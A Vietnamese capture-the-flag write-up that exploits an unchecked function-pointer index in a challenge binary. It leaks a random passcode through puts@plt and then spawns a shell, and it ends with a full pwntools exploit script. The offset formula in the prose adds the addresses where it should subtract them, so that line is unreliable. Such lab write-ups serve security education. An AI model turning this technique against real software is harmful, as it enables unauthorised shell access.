
```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  __int64 choice; // [rsp+0h] [rbp-10h]
  __int64 ag; // [rsp+8h] [rbp-8h]

  setup(argc, argv, envp);
  printf("[*] NickName> ");
  if ( read(0, &username, 0x40uLL) == -1 )
  {
    perror("READ ERROR");
    exit(-1);
  }
  while ( 1 )
  {
    menu();
    choice = read_int();
    printf("[*] Guess>");
    ag = read_int();
    ((void (__fastcall *)(__int64))conv[choice - 1])(ag);
  }
}
```
```c
__int64 read_int()
{
  __int64 buf[6]; // [rsp+0h] [rbp-30h] BYREF

  buf[5] = __readfsqword(0x28u);
  memset(buf, 0, 32);
  printf("> ");
  if ( read(0, buf, 0x20uLL) == -1 )
  {
    perror("READ ERROR");
    exit(-1);
  }
  return atol((const char *)buf);
}
```
```c
unsigned __int64 __fastcall hard(__int64 a1)
{
  int i; // [rsp+14h] [rbp-2Ch]
  char path[8]; // [rsp+2Fh] [rbp-11h] BYREF
  char v4; // [rsp+37h] [rbp-9h]
  unsigned __int64 v5; // [rsp+38h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  strcpy(path, "<qz}<`{");
  v4 = 0;
  for ( i = 0; i <= 6; ++i )
    path[i] ^= 0x13u;
  if ( a1 == passcode )
  {
    puts("[+] WINNNN!");
    execve(path, 0LL, 0LL);
  }
  else
  {
    puts("[-] YOU ARE NOT WORTHY FOR A SHELL!");
  }
  change_passcode();
  return v5 - __readfsqword(0x28u);
}
```

Về cơ bản thì chương trình sẽ cho phép ta nhập `tên` vào biến `username` và tiếp đến sẽ cho ta những `options` để chọn. Để ý ở hàm `main` ta thấy:
```c
  while ( 1 )
  {
    menu();
    choice = read_int();
    printf("[*] Guess>");
    ag = read_int();
    ((void (__fastcall *)(__int64))conv[choice - 1])(ag);
  }
}
```
Thì ở đây nó dùng `((void (__fastcall *)(__int64))conv[choice - 1])(ag);` cho phép tạo một con trỏ hàm cho phép nhận duy nhất một tham số với `conv[choice - 1]` là mảng lưu trữ 2 hàm `easy` và `hard`. Và khi ta nhập option `2` thì nó sẽ chuyển sang hàm `hard` cho ta. Hàm này sẽ cho ta tạo `shell` nếu ta đoán đúng `passcode` và `passcode` được gán giá trị random nhờ hàm `change_passcode`:
```c
int change_passcode()
{
  int fd; // [rsp+Ch] [rbp-4h]

  fd = open("/dev/random", 0);
  if ( fd < 0 )
  {
    perror("OPEN ERROR");
    exit(-1);
  }
  if ( read(fd, &passcode, 8uLL) == -1 )
  {
    perror("READ ERROR");
    exit(-1);
  }
  puts("[*] PASSCODE CHANGED!");
  return close(fd);
}
```
Hàm sẽ lấy giá trị ngẫu nhiên từ `/dev/random` và gán nó vào `&passcode`. Đến đây mình khá bí vì không biết nên làm gì tiếp theo, nên là mình đã debug file này một hồi khá lâu thì nhận ra rằng `((void (__fastcall *)(__int64))conv[choice - 1])(ag)` trước khi nó gọi một hàm nào đó nó sẽ setup `conv[choice - 1]` như thế này:
```
   0x401609 <main+148>    mov    qword ptr [rbp - 8], rax        [0x7fffffffdbc8] <= 0x2b67
   0x40160d <main+152>    mov    rax, qword ptr [rbp - 0x10]     RAX, [0x7fffffffdbc0] => 2
   0x401611 <main+156>    sub    rax, 1                          RAX => 1 (2 - 1)
 ► 0x401615 <main+160>    lea    rdx, [rax*8]                    RDX => 8
   0x40161d <main+168>    lea    rax, [rip + 0x29ec]             RAX => 0x404010 (conv) —▸ 0x4012e1 (easy) ◂— push rbp
   0x401624 <main+175>    mov    rdx, qword ptr [rdx + rax]      RDX, [conv+8] => 0x40132c (hard) ◂— push rbp
   0x401628 <main+179>    mov    rax, qword ptr [rbp - 8]        RAX, [0x7fffffffdbc8] => 0x2b67
   0x40162c <main+183>    mov    rdi, rax                        RDI => 0x2b67
   0x40162f <main+186>    call   rdx                         <hard>
```

Thì mình đã nhập `choice` là `2`, như ta có thể thấy nó lấy kết quả đó trừ 1 và lưu vào `rax` và rồi lấy kết quả đó tính toán cho `rdx` (ở lần thử này `rdx = 8`). Tiếp đến gán địa chỉ của `conv` cho rax và cuối cùng là gán địa chỉ của `conv+offset` cho `rdx` rồi thực thi nó. Điều này làm cho mình nảy ra ý tưởng có thể tận dùng cái này để leak ra `passcode`. Và ý tưởng của mình là:

- Ta tận dụng put@plt nhập vào `username` 
- Ở lần nhập `ag` mình sẽ nhập vào địa chỉ của `passcode`

Nhưng điều đầu tiên chúng ta cần làm là tính toán giá trị từ `conv` đến `username` trong memory để khi nó thực thi nó sẽ thực thi `got@plt` ta để ở biến `username`. `username` có địa chỉ `0x404080` và `conv` có địa chỉ `0x404010`. Offset từ `conv` -> `username` sẽ là `[(0x404080 + 0x404010) // 8] + 1 = 15`. Như vậy ta có thể leak được `passcode` và dùng nó để tạo shell

Full exploit:

```py
#!/usr/bin/python3
from pwncus import *

# context.log_level = 'debug'
exe = context.binary = ELF('./chall', checksec=False)


def GDB(): gdb.attach(p, gdbscript='''


c
''') if not args.REMOTE else None

p = remote('', ) if args.REMOTE else process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT 
# ===========================================================

passcode_address = 0x404060
puts_plt = exe.plt.puts

sa(b'[*] NickName> ', p64(puts_plt))
sla(b'> ', b'15')
sa(b'>', str(passcode_address).encode())

ru(b'> ')
# print(ru(b'\n'))
passcode = u64(ru(b'\n').strip())
print(f'Passcode leak: {passcode}')

sla(b'> ', b'2')
sa(b'>', str(passcode).encode())
interactive()
```